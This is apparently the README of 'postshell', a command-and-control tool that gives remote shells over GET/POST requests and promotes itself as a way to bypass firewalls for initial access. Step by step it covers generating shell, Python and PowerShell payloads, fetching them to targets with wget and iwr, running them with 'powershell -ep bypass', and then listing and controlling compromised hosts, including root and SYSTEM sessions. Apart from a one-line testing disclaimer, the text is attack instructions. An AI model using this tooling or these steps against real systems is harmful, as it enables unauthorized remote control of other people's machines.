```
██████╗  ██████╗ ███████╗████████╗███████╗██╗  ██╗███████╗██╗     ██╗     
██╔══██╗██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██║  ██║██╔════╝██║     ██║     
██████╔╝██║   ██║███████╗   ██║   ███████╗███████║█████╗  ██║     ██║     
██╔═══╝ ██║   ██║╚════██║   ██║   ╚════██║██╔══██║██╔══╝  ██║     ██║     
██║     ╚██████╔╝███████║   ██║   ███████║██║  ██║███████╗███████╗███████╗
╚═╝      ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```
Execute commands on clients using GET/POST requests. (Bypass Firewalls for initial access)

There are some limitations, however, can be very useful if firewall is blocking standard reverse shells.

How postshell works:
  - Listens for http requests on a user specified port
  - Generates a web request script `(sh, py, ps1)`
  - Client scripts connect to the server using POST requests, submitting machine information
  - Client scripts continue to GET commands from the server, execute the commands, then POST results back to the server 

# Disclaimer
This is only for testing purposes, not intended for anything illegal.

# Getting Started
1. Download POSTSHELL
```
git clone https://github.com/bwithe/postshell
```

# Usage
1. To start the server
```
python3 postshell.py <port>
```

2. Generate a Client script that creates a directory called "tools" with the scripts
    - This server also allows GET requests from "tools"
    - You can also store other tools needed (ex: winpeas, linpeas, sharphound, etc)
```
postshell> payload 
payload> options 

Current Payload Options:

  LHOST     : 127.0.0.1
  LPORT     : 80
  PAYLOAD   : sh
  CHECKIN   : 1

payload> set lhost 127.0.0.1
[+] Set lhost to 127.0.0.1
payload> set lport 80
[+] Set lport to 80
payload> set payload sh
[+] Set payload to sh
payload> set checkin 1
[+] Set checkin to 1
payload> generate 
[+] Payload generated and saved as tools/127_0_0_1_80.sh
```
3. Transfer the client script
```
wget http://127.0.0.1:80/tools/127_0_0_1_80.sh

wget http://127.0.0.1:80/tools/127_0_0_1_80.py

iwr http://127.0.0.1:80/tools/127_0_0_1_80.ps1 -outfile 127_0_0_1_80.ps1
```

4. Execute the script on the client
```
bash 127_0_0_1_80.sh

python3 127_0_0_1_80.py

powershell -ep bypass 127_0_0_1_80.ps1
```

5. To see active clients
```
postshell> list 
╔════╦═════════════════╦═════════════════╦═════════╦════════════════╦══════════════════╦════════╗
║ ID ║ IP              ║ HOSTNAME        ║ USER    ║ OS             ║ VERSION          ║ ARCH   ║
╠════╬═════════════════╬═════════════════╬═════════╬════════════════╬══════════════════╬════════╣
║ 1  ║ 192.168.193.131 ║ ubuntu          ║ clyde   ║ Linux          ║ 6.8.0-41-generic ║ x86_64 ║
║ 2  ║ 192.168.193.131 ║ ubuntu          ║ root    ║ Linux          ║ 6.8.0-41-generic ║ x86_64 ║
║ 3  ║ 192.168.193.129 ║ DESKTOP-P5KACDB ║ jimothy ║ Windows 10 Pro ║ 10.0.19045       ║ 64-bit ║
║ 4  ║ 192.168.193.129 ║ DESKTOP-P5KACDB ║ system  ║ Windows 10 Pro ║ 10.0.19045       ║ 64-bit ║
╚════╩═════════════════╩═════════════════╩═════════╩════════════════╩══════════════════╩════════╝
```

6. To connect to an active session
```
postshell> select 3
[jimothy@DESKTOP-P5KACDB]>
```

7. Execute commands, and wait for the client to GET the command, then POST the results
```
[jimothy@DESKTOP-P5KACDB]> pwd
C:\Users\jimothy\Downloads
```
  
8. To background a session
```
[jimothy@DESKTOP-P5KACDB]> background
```

9. To kill the current session
```
[jimothy@DESKTOP-P5KACDB]> die
```

10. Kill an active session from the menu
```
postshell> kill 3
[!] Sent kill command to jimothy@DESKTOP-P5KACDB
```

11. To kill all sessions, and exit POSTSHELL
```
postshell> exit 
[!] Shutting down server and all sessions.
```
